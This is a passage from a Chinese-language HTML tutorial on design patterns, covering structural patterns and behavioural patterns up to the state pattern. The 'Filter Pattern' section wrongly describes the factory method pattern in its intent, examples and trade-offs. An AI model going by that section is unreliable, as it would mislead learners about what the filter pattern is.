产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式。</li><li>一个对象多个修改者的场景。</li><li>一个对象需要提供给其他对象访问，而且各个调用者可能都需要修改其值时，可以考虑使用原型模式拷贝多个对象供调用者使用。</li><li>在实际项目中，原型模式很少单独出现，一般是和工厂方法模式一起出现，通过 clone 的方法创建一个对象，然后由工厂方法提供给调用者。原型模式已经与 Java 融为浑然一体，大家可以随手拿来使用。</li></ol><p>  注意事项：<br />  与通过对一个类进行实例化来构造新对象不同的是，原型模式是通过拷贝一个现有对象生成新对象的。浅拷贝实现 Cloneable，重写，深拷贝是通过实现 Serializable 读取二进制流。</p><h3 id="实现-4"><a class="markdownIt-Anchor" href="#实现-4"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/prototype_pattern_uml_diagram.jpg" alt="" /></p><h1 id="二-结构型"><a class="markdownIt-Anchor" href="#二-结构型"></a> 二、结构型</h1><h2 id="1适配器adapter-pattern"><a class="markdownIt-Anchor" href="#1适配器adapter-pattern"></a> 1.适配器(Adapter Pattern)</h2><h3 id="介绍-6"><a class="markdownIt-Anchor" href="#介绍-6"></a> 介绍</h3><p>  意图：<br />  将一个类的接口转换成客户希望的另外一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。</p><p>  主要解决：<br />  主要解决在软件系统中，常常要将一些&quot;现存的对象&quot;放到新的环境中，而新环境要求的接口是现对象不能满足的。</p><p>  何时使用：</p><ol><li>系统需要使用现有的类，而此类的接口不符合系统的需要。</li><li>想要建立一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作，这些源类不一定有一致的接口。</li><li>通过接口转换，将一个类插入另一个类系中。（比如老虎和飞禽，现在多了一个飞虎，在不增加实体的需求下，增加一个适配器，在里面包容一个虎对象，实现飞的接口。）</li></ol><p>  如何解决：继承或依赖（推荐）。</p><p>  关键代码：适配器继承或依赖已有的对象，实现想要的目标接口。</p><p>  应用实例：</p><ol><li>美国电器 110V，中国 220V，就要有一个适配器将 110V 转化为 220V。</li><li>JAVA JDK 1.1 提供了 Enumeration 接口，而在 1.2 中提供了 Iterator 接口，想要使用 1.2 的 JDK，则要将以前系统的 Enumeration 接口转化为 Iterator 接口，这时就需要适配器模式。</li><li>在 LINUX 上运行 WINDOWS 程序。</li><li>JAVA 中的 jdbc。</li></ol><p>  优点：</p><ol><li>可以让任何两个没有关联的类一起运行。</li><li>提高了类的复用。</li><li>增加了类的透明度。</li><li>灵活性好。</li></ol><p>  缺点：</p><ol><li>过多地使用适配器，会让系统非常零乱，不易整体进行把握。比如，明明看到调用的是 A 接口，其实内部被适配成了 B 接口的实现，一个系统如果太多出现这种情况，无异于一场灾难。因此如果不是很有必要，可以不使用适配器，而是直接对系统进行重构。</li><li>由于 JAVA 至多继承一个类，所以至多只能适配一个适配者类，而且目标类必须是抽象类。</li></ol><p>  使用场景：有动机地修改一个正常运行的系统的接口，这时应该考虑使用适配器模式。</p><p>  注意事项：适配器不是在详细设计时添加的，而是解决正在服役的项目的问题。</p><h3 id="实现-5"><a class="markdownIt-Anchor" href="#实现-5"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/adapter_pattern_uml_diagram.jpg" alt="" /></p><h2 id="2桥接bridge-pattern"><a class="markdownIt-Anchor" href="#2桥接bridge-pattern"></a> 2.桥接(Bridge Pattern)</h2><h3 id="介绍-7"><a class="markdownIt-Anchor" href="#介绍-7"></a> 介绍</h3><p>  意图：将抽象部分与实现部分分离，使它们都可以独立的变化。</p><p>  主要解决：在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。</p><p>  何时使用：实现系统可能有多个角度分类，每一种角度都可能变化。</p><p>  如何解决：把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合。</p><p>  关键代码：抽象类依赖实现类。</p><p>  应用实例：</p><ol><li>猪八戒从天蓬元帅转世投胎到猪，转世投胎的机制将尘世划分为两个等级，即：灵魂和肉体，前者相当于抽象化，后者相当于实现化。生灵通过功能的委派，调用肉体对象的功能，使得生灵可以动态地选择。</li><li>墙上的开关，可以看到的开关是抽象的，不用管里面具体怎么实现的。</li></ol><p>  优点：</p><ol><li>抽象和实现的分离。</li><li>优秀的扩展能力。</li><li>实现细节对客户透明。</li></ol><p>  缺点：桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。</p><p>  使用场景：</p><ol><li>如果一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性，避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。</li><li>对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用。</li><li>一个类存在两个独立变化的维度，且这两个维度都需要进行扩展。</li></ol><p>  注意事项：对于两个独立变化的维度，使用桥接模式再适合不过了。</p><h3 id="实现-6"><a class="markdownIt-Anchor" href="#实现-6"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/bridge_pattern_uml_diagram.jpg" alt="" /></p><h2 id="3过滤器filter-pattern"><a class="markdownIt-Anchor" href="#3过滤器filter-pattern"></a> 3.过滤器(Filter Pattern)</h2><h3 id="介绍-8"><a class="markdownIt-Anchor" href="#介绍-8"></a> 介绍</h3><p>  意图：定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。</p><p>  主要解决：主要解决接口选择的问题。</p><p>  何时使用：我们明确地计划不同条件下创建不同实例时。</p><p>  如何解决：让其子类实现工厂接口，返回的也是一个抽象的产品。</p><p>  关键代码：创建过程在其子类执行。</p><p>  应用实例：</p><ol><li>您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。</li><li>Hibernate 换数据库只需换方言和驱动就可以。</li></ol><p>  优点：</p><ol><li>一个调用者想创建一个对象，只要知道其名称就可以了。</li><li>扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。</li><li>屏蔽产品的具体实现，调用者只关心产品的接口。</li></ol><p>  缺点：<br />  每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。</p><p>  使用场景：</p><ol><li>日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。</li><li>数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。</li><li>设计一个连接服务器的框架，需要三个协议，“POP3”、“IMAP”、“HTTP”，可以把这三个作为产品类，共同实现一个接口。</li></ol><p>  注意事项：<br />  作为一种创建类模式，在任何需要生成复杂对象的地方，都可以使用工厂方法模式。有一点需要注意的地方就是复杂对象适合使用工厂模式，而简单对象，特别是只需要通过 new 就可以完成创建的对象，无需使用工厂模式。如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度。</p><h3 id="实现-7"><a class="markdownIt-Anchor" href="#实现-7"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/filter_pattern_uml_diagram.jpg" alt="" /></p><h2 id="4组合composite-pattern"><a class="markdownIt-Anchor" href="#4组合composite-pattern"></a> 4.组合(Composite Pattern)</h2><h3 id="介绍-9"><a class="markdownIt-Anchor" href="#介绍-9"></a> 介绍</h3><p>  意图：将对象组合成树形结构以表示&quot;部分-整体&quot;的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。</p><p>  主要解决：它在我们树型结构的问题中，模糊了简单元素和复杂元素的概念，客户程序可以向处理简单元素一样来处理复杂元素，从而使得客户程序与复杂元素的内部结构解耦。</p><p>  何时使用：</p><ol><li>您想表示对象的部分-整体层次结构（树形结构）。</li><li>您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。</li></ol><p>  如何解决：树枝和叶子实现统一接口，树枝内部组合该接口。</p><p>  关键代码：树枝内部组合该接口，并且含有内部属性 List，里面放 Component。</p><p>  应用实例：</p><ol><li>算术表达式包括操作数、操作符和另一个操作数，其中，另一个操作符也可以是操作数、操作符和另一个操作数。</li><li>在 JAVA AWT 和 SWING 中，对于 Button 和 Checkbox 是树叶，Container 是树枝。</li></ol><p>  优点：</p><ol><li>高层模块调用简单。</li><li>节点自由增加。</li></ol><p>  缺点：在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。</p><p>  使用场景：部分、整体场景，如树形菜单，文件、文件夹的管理。</p><p>  注意事项：定义时为具体类。</p><h3 id="实现-8"><a class="markdownIt-Anchor" href="#实现-8"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/composite_pattern_uml_diagram.jpg" alt="" /></p><h2 id="5装饰器decorator-pattern"><a class="markdownIt-Anchor" href="#5装饰器decorator-pattern"></a> 5.装饰器(Decorator Pattern)</h2><h3 id="介绍-10"><a class="markdownIt-Anchor" href="#介绍-10"></a> 介绍</h3><p>  意图：动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。</p><p>  主要解决：一般的，我们为了扩展一个类经常使用继承方式实现，由于继承为类引入静态特征，并且随着扩展功能的增多，子类会很膨胀。</p><p>  何时使用：在不想增加很多子类的情况下扩展类。</p><p>  如何解决：将具体功能职责划分，同时继承装饰者模式。</p><p>  关键代码：</p><ol><li>Component 类充当抽象角色，不应该具体实现。</li><li>修饰类引用和继承 Component 类，具体扩展类重写父类方法。</li></ol><p>  应用实例：</p><ol><li>孙悟空有 72 变，当他变成&quot;庙宇&quot;后，他的根本还是一只猴子，但是他又有了庙宇的功能。</li><li>论一幅画有没有画框都可以挂在墙上，但是通常都是有画框的，并且实际上是画框被挂在墙上。在挂在墙上之前，画可以被蒙上玻璃，装到框子里；这时画、玻璃和画框形成了一个物体。</li></ol><p>  优点：装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。</p><p>  缺点：多层装饰比较复杂。</p><p>  使用场景：</p><ol><li>扩展一个类的功能。</li><li>动态增加功能，动态撤销。</li></ol><p>  注意事项：可代替继承。</p><h3 id="实现-9"><a class="markdownIt-Anchor" href="#实现-9"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/decorator_pattern_uml_diagram.jpg" alt="" /></p><h2 id="6外观模式facade-pattern"><a class="markdownIt-Anchor" href="#6外观模式facade-pattern"></a> 6.外观模式(Facade Pattern)</h2><h3 id="介绍-11"><a class="markdownIt-Anchor" href="#介绍-11"></a> 介绍</h3><p>  意图：为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p><p>  主要解决：降低访问复杂系统的内部子系统时的复杂度，简化客户端与之的接口。</p><p>  何时使用：</p><ol><li>客户端不需要知道系统内部的复杂联系，整个系统只需提供一个&quot;接待员&quot;即可。</li><li>定义系统的入口。</li></ol><p>  如何解决：客户端不与系统耦合，外观类与系统耦合。</p><p>  关键代码：在客户端和复杂系统之间再加一层，这一层将调用顺序、依赖关系等处理好。</p><p>  应用实例：</p><ol><li>去医院看病，可能要去挂号、门诊、划价、取药，让患者或患者家属觉得很复杂，如果有提供接待人员，只让接待人员来处理，就很方便。</li><li>JAVA 的三层开发模式。</li></ol><p>  优点：</p><ol><li>减少系统相互依赖。</li><li>提高灵活性。</li><li>提高了安全性。</li></ol><p>  缺点：不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。</p><p>  使用场景：</p><ol><li>为复杂的模块或子系统提供外界访问的模块。</li><li>子系统相对独立。</li><li>预防低水平人员带来的风险。</li></ol><p>  注意事项：在层次化结构中，可以使用外观模式定义系统中每一层的入口。</p><h3 id="实现-10"><a class="markdownIt-Anchor" href="#实现-10"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/facade_pattern_uml_diagram.jpg" alt="" /></p><h2 id="7享元模式flyweight-pattern"><a class="markdownIt-Anchor" href="#7享元模式flyweight-pattern"></a> 7.享元模式（Flyweight Pattern）</h2><h3 id="介绍-12"><a class="markdownIt-Anchor" href="#介绍-12"></a> 介绍</h3><p>  意图：运用共享技术有效地支持大量细粒度的对象。</p><p>  主要解决：在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。</p><p>  何时使用：</p><ol><li>系统中有大量对象。</li><li>这些对象消耗大量内存。</li><li>这些对象的状态大部分可以外部化。</li><li>这些对象可以按照内蕴状态分为很多组，当把外蕴对象从对象中剔除出来时，每一组对象都可以用一个对象来代替。</li><li>系统不依赖于这些对象身份，这些对象是不可分辨的。</li></ol><p>  如何解决：用唯一标识码判断，如果在内存中有，则返回这个唯一标识码所标识的对象。</p><p>  关键代码：用 HashMap 存储这些对象。</p><p>  应用实例：</p><ol><li>JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。</li><li>数据库的数据池。</li></ol><p>  优点：大大减少对象的创建，降低系统的内存，使效率提高。</p><p>  缺点：提高了系统的复杂度，需要分离出外部状态和内部状态，而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。</p><p>  使用场景：</p><ol><li>系统有大量相似对象。</li><li>需要缓冲池的场景。</li></ol><p>注意事项：</p><ol><li>注意划分外部状态和内部状态，否则可能会引起线程安全问题。</li><li>这些类必须有一个工厂对象加以控制。</li></ol><h3 id="实现-11"><a class="markdownIt-Anchor" href="#实现-11"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/flyweight_pattern_uml_diagram-1.jpg" alt="" /></p><h2 id="8代理模式proxy-pattern"><a class="markdownIt-Anchor" href="#8代理模式proxy-pattern"></a> 8.代理模式（Proxy Pattern）</h2><h3 id="介绍-13"><a class="markdownIt-Anchor" href="#介绍-13"></a> 介绍</h3><p>  意图：为其他对象提供一种代理以控制对这个对象的访问。</p><p>  主要解决：<br />  在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p><p>  何时使用：想在访问一个类时做一些控制。</p><p>  如何解决：增加中间层。</p><p>  关键代码：实现与被代理类组合。</p><p>  应用实例：</p><ol><li>Windows 里面的快捷方式。</li><li>猪八戒去找高翠兰结果是孙悟空变的，可以这样理解：把高翠兰的外貌抽象出来，高翠兰本人和孙悟空都实现了这个接口，猪八戒访问高翠兰的时候看不出来这个是孙悟空，所以说孙悟空是高翠兰代理类。</li><li>买火车票不一定在火车站买，也可以去代售点。</li><li>一张支票或银行存单是账户中资金的代理。支票在市场交易中用来代替现金，并提供对签发人账号上资金的控制。</li><li>Spring AOP。</li></ol><p>  优点：</p><ol><li>职责清晰。</li><li>高扩展性。</li><li>智能化。</li></ol><p>  缺点：</p><ol><li>由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。</li><li>实现代理模式需要额外的工作，有些代理模式的实现非常复杂。</li></ol><p>  使用场景：按职责来划分，通常有以下使用场景：</p><ol><li>远程代理。</li><li>虚拟代理。</li><li>Copy-on-Write 代理。</li><li>保护（Protect or Access）代理。</li><li>Cache代理。</li><li>防火墙（Firewall）代理。</li><li>同步化（Synchronization）代理。</li><li>智能引用（Smart Reference）代理。</li></ol><p>注意事项：</p><ol><li>和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。</li><li>和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。</li></ol><h3 id="实现-12"><a class="markdownIt-Anchor" href="#实现-12"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/proxy_pattern_uml_diagram.jpg" alt="" /></p><h1 id="三-行为型模式"><a class="markdownIt-Anchor" href="#三-行为型模式"></a> 三、行为型模式</h1><h2 id="1责任链模式chain-of-responsibility-pattern"><a class="markdownIt-Anchor" href="#1责任链模式chain-of-responsibility-pattern"></a> 1.责任链模式（Chain of Responsibility Pattern）</h2><h3 id="介绍-14"><a class="markdownIt-Anchor" href="#介绍-14"></a> 介绍</h3><p>  意图：<br />  避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</p><p>  主要解决：<br />  职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。</p><p>  何时使用：在处理消息的时候以过滤很多道。</p><p>  如何解决：拦截的类都实现统一接口。</p><p>  关键代码：Handler 里面聚合它自己，在 HandlerRequest 里判断是否合适，如果没达到条件则向下传递，向谁传递之前 set 进去。</p><p>  应用实例：</p><ol><li>红楼梦中的&quot;击鼓传花&quot;。</li><li>JS 中的事件冒泡。</li><li>JAVA WEB 中 Apache Tomcat 对 Encoding 的处理，Struts2 的拦截器，jsp servlet 的 Filter。</li></ol><p>  优点：</p><ol><li>降低耦合度。它将请求的发送者和接收者解耦。</li><li>简化了对象。使得对象不需要知道链的结构。</li><li>增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。</li><li>增加新的请求处理类很方便。</li></ol><p>  缺点：</p><ol><li>不能保证请求一定被接收。</li><li>系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。</li><li>可能不容易观察运行时的特征，有碍于除错。</li></ol><p>  使用场景：</p><ol><li>有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。</li><li>在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。</li><li>可动态指定一组对象处理请求。</li></ol><h3 id="实现-13"><a class="markdownIt-Anchor" href="#实现-13"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/chain_pattern_uml_diagram.jpg" alt="" /></p><h2 id="2命令模式command-pattern"><a class="markdownIt-Anchor" href="#2命令模式command-pattern"></a> 2.命令模式（Command Pattern）</h2><h3 id="介绍-15"><a class="markdownIt-Anchor" href="#介绍-15"></a> 介绍</h3><p>  意图：将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。</p><p>  主要解决：在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。</p><p>  何时使用：在某些场合，比如要对行为进行&quot;记录、撤销/重做、事务&quot;等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将&quot;行为请求者&quot;与&quot;行为实现者&quot;解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。</p><p>  如何解决：通过调用者调用接受者执行命令，顺序：调用者→接受者→命令。</p><p>  优点：</p><ol><li>降低了系统耦合度。</li><li>新的命令可以很容易添加到系统中去。</li></ol><p>  缺点：使用命令模式可能会导致某些系统有过多的具体命令类。</p><p>  使用场景：<br />  认为是命令的地方都可以使用命令模式，比如：</p><ol><li>GUI 中每一个按钮都是一条命令。</li><li>模拟 CMD。</li></ol><p>  注意事项：系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作，也可以考虑使用命令模式，见命令模式的扩展。</p><h3 id="实现-14"><a class="markdownIt-Anchor" href="#实现-14"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/command_pattern_uml_diagram.jpg" alt="" /></p><h2 id="3解释器模式interpreter-pattern"><a class="markdownIt-Anchor" href="#3解释器模式interpreter-pattern"></a> 3.解释器模式（Interpreter Pattern）</h2><h3 id="介绍-16"><a class="markdownIt-Anchor" href="#介绍-16"></a> 介绍</h3><p>  意图：给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。</p><p>  主要解决：对于一些固定文法构建一个解释句子的解释器。</p><p>  何时使用：如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。</p><p>  如何解决：构建语法树，定义终结符与非终结符。</p><p>  关键代码：构建环境类，包含解释器之外的一些全局信息，一般是 HashMap。</p><p>  应用实例：编译器、运算表达式计算。</p><p>  优点：</p><ol><li>可扩展性比较好，灵活。</li><li>增加了新的解释表达式的方式。</li><li>易于实现简单文法。</li></ol><p>  缺点：</p><ol><li>可利用场景比较少。</li><li>对于复杂的文法比较难维护。</li><li>解释器模式会引起类膨胀。</li><li>解释器模式采用递归调用方法。</li></ol><p>  使用场景：</p><ol><li>可以将一个需要解释执行的语言中的句子表示为一个抽象语法树。</li><li>一些重复出现的问题可以用一种简单的语言来进行表达。</li><li>一个简单语法需要解释的场景。</li></ol><p>  注意事项：可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。</p><h3 id="实现-15"><a class="markdownIt-Anchor" href="#实现-15"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/interpreter_pattern_uml_diagram.jpg" alt="" /></p><h2 id="4迭代器模式iterator-pattern"><a class="markdownIt-Anchor" href="#4迭代器模式iterator-pattern"></a> 4.迭代器模式（Iterator Pattern）</h2><h3 id="介绍-17"><a class="markdownIt-Anchor" href="#介绍-17"></a> 介绍</h3><p>  意图：提供一种方法顺序访问一个聚合对象中各个元素, 而又无须暴露该对象的内部表示。</p><p>  主要解决：不同的方式来遍历整个整合对象。</p><p>  何时使用：遍历一个聚合对象。</p><p>  如何解决：把在元素之间游走的责任交给迭代器，而不是聚合对象。</p><p>  关键代码：定义接口：hasNext, next。</p><p>  应用实例：JAVA 中的 iterator。</p><p>  优点：</p><ol><li>它支持以不同的方式遍历一个聚合对象。</li><li>迭代器简化了聚合类。</li><li>在同一个聚合上可以有多个遍历。</li><li>在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。</li></ol><p>  缺点：由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。</p><p>  使用场景：</p><ol><li>访问一个聚合对象的内容而无须暴露它的内部表示。</li><li>需要为聚合对象提供多种遍历方式。</li><li>为遍历不同的聚合结构提供一个统一的接口。</li></ol><p>  注意事项：迭代器模式就是分离了集合</p><h3 id="实现-16"><a class="markdownIt-Anchor" href="#实现-16"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/iterator_pattern_uml_diagram.jpg" alt="" /></p><h2 id="5中介者模式mediator-pattern"><a class="markdownIt-Anchor" href="#5中介者模式mediator-pattern"></a> 5.中介者模式（Mediator Pattern）</h2><h3 id="介绍-18"><a class="markdownIt-Anchor" href="#介绍-18"></a> 介绍</h3><p>  意图：用一个中介对象来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。</p><p>  主要解决：对象与对象之间存在大量的关联关系，这样势必会导致系统的结构变得很复杂，同时若一个对象发生改变，我们也需要跟踪与之相关联的对象，同时做出相应的处理。</p><p>  何时使用：多个类相互耦合，形成了网状结构。</p><p>  如何解决：将上述网状结构分离为星型结构。</p><p>  关键代码：对象 Colleague 之间的通信封装到一个类中单独处理。</p><p>  应用实例：</p><ol><li>中国加入 WTO 之前是各个国家相互贸易，结构复杂，现在是各个国家通过 WTO 来互相贸易。</li><li>机场调度系统。</li><li>MVC 框架，其中C（控制器）就是 M（模型）和 V（视图）的中介者。</li></ol><p>  优点：</p><ol><li>降低了类的复杂度，将一对多转化成了一对一。</li><li>各个类之间的解耦。</li><li>符合迪米特原则。</li></ol><p>  缺点：中介者会庞大，变得复杂难以维护。</p><p>  使用场景：</p><ol><li>系统中对象之间存在比较复杂的引用关系，导致它们之间的依赖关系结构混乱而且难以复用该对象。</li><li>想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。</li></ol><p>  注意事项：不应当在职责混乱的时候使用。</p><h3 id="实现-17"><a class="markdownIt-Anchor" href="#实现-17"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/mediator_pattern_uml_diagram.jpg" alt="" /></p><h2 id="6备忘录模式memento-pattern"><a class="markdownIt-Anchor" href="#6备忘录模式memento-pattern"></a> 6.备忘录模式（Memento Pattern）</h2><h3 id="介绍-19"><a class="markdownIt-Anchor" href="#介绍-19"></a> 介绍</h3><p>  意图：在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。</p><p>  主要解决：所谓备忘录模式就是在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。</p><p>  何时使用：很多时候我们总是需要记录一个对象的内部状态，这样做的目的就是为了允许用户取消不确定或者错误的操作，能够恢复到他原先的状态，使得他有&quot;后悔药&quot;可吃。</p><p>  如何解决：通过一个备忘录类专门存储对象状态。</p><p>  关键代码：客户不与备忘录类耦合，与备忘录管理类耦合。</p><p>  应用实例：</p><ol><li>后悔药。</li><li>打游戏时的存档。</li><li>Windows 里的 ctri + z。</li><li>IE 中的后退。</li><li>数据库的事务管理。</li></ol><p>  优点：</p><ol><li>给用户提供了一种可以恢复状态的机制，可以使用户能够比较方便地回到某个历史的状态。</li><li>实现了信息的封装，使得用户不需要关心状态的保存细节。</li></ol><p>  缺点：消耗资源。如果类的成员变量过多，势必会占用比较大的资源，而且每一次保存都会消耗一定的内存。</p><p>  使用场景：</p><ol><li>需要保存/恢复数据的相关状态场景。</li><li>提供一个可回滚的操作。</li></ol><p>  注意事项：</p><ol><li>为了符合迪米特原则，还要增加一个管理备忘录的类。</li><li>为了节约内存，可使用原型模式+备忘录模式。</li></ol><h3 id="实现-18"><a class="markdownIt-Anchor" href="#实现-18"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/memento_pattern_uml_diagram.jpg" alt="" /></p><h2 id="7观察者模式observer-pattern"><a class="markdownIt-Anchor" href="#7观察者模式observer-pattern"></a> 7.观察者模式（Observer Pattern）</h2><h3 id="介绍-20"><a class="markdownIt-Anchor" href="#介绍-20"></a> 介绍</h3><p>  意图：定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。</p><p>  主要解决：一个对象状态改变给其他对象通知的问题，而且要考虑到易用和低耦合，保证高度的协作。</p><p>  何时使用：一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知，进行广播通知。</p><p>  如何解决：使用面向对象技术，可以将这种依赖关系弱化。</p><p>  关键代码：在抽象类里有一个 ArrayList 存放观察者们。</p><p>  应用实例：</p><ol><li>拍卖的时候，拍卖师观察最高标价，然后通知给其他竞价者竞价。</li><li>西游记里面悟空请求菩萨降服红孩儿，菩萨洒了一地水招来一个老乌龟，这个乌龟就是观察者，他观察菩萨洒水这个动作。</li></ol><p>  优点：</p><ol><li>观察者和被观察者是抽象耦合的。</li><li>建立一套触发机制。</li></ol><p>  缺点：</p><ol><li>如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。</li><li>如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。</li><li>观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</li></ol><p>  使用场景：</p><ol><li>一个抽象模型有两个方面，其中一个方面依赖于另一个方面。将这些方面封装在独立的对象中使它们可以各自独立地改变和复用。</li><li>一个对象的改变将导致其他一个或多个对象也发生改变，而不知道具体有多少对象将发生改变，可以降低对象之间的耦合度。</li><li>一个对象必须通知其他对象，而并不知道这些对象是谁。</li><li>需要在系统中创建一个触发链，A对象的行为将影响B对象，B对象的行为将影响C对象……，可以使用观察者模式创建一种链式触发机制。</li></ol><p>  注意事项：</p><ol><li>JAVA 中已经有了对观察者模式的支持类。</li><li>避免循环引用。</li><li>如果顺序执行，某一观察者错误会导致系统卡壳，一般采用异步方式。</li></ol><h3 id="实现-19"><a class="markdownIt-Anchor" href="#实现-19"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/observer_pattern_uml_diagram.jpg" alt="" /></p><h2 id="8状态模式state-pattern"><a class="markdownIt-Anchor" href="#8状态模式state-pattern"></a> 8.状态模式（State Pattern）</h2><h3 id="介绍-21"><a class="markdownIt-Anchor" href="#介绍-21"></a> 介绍</h3><p>  意图：允许对象在内部状态发生改变时改变它的行为，对象看起来好像修改了它的类。</p><p>  主要解决：对象的行为依赖于它的状态（属性），并且可以根据它的状态改变而改变它的相关行为。</p><p>  何时使用：代码中包含大量与对象状态有关的条件语句。</p><p>  如何解决：将各种具体的状态类抽象出来。</p><p>  关键代码：通常命令模式的接口中只有一个方法。而状态模式的接口中有一个或者多个方法。而且，状态模式的实现类的方法，一般返回值，或者是改变实例变量的值。也就是说，状态模式一般和对象的状态有关。实现类的方法有不同的功能，覆盖接口中的方法。状态模式和命令模式一样，也可以用于消除 if…else 等条件选择语句。</p><p>  应用实例：</p><ol><li>打篮球的时候运动员可以有正常状态、不正常状态和超常状态。</li><li>曾侯乙编钟中，‘钟是抽象接口’,'钟A’等是具体状态，'曾侯乙编钟’是具体环境（Context）。</li></ol><p>  优点：</p><ol><li>封装了转换规则。</li><li>枚举可能的状态，在枚举状态之前需要确定状态种类。</li><li>将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。</li><li>允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。</li><li>可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。</li></ol><p>  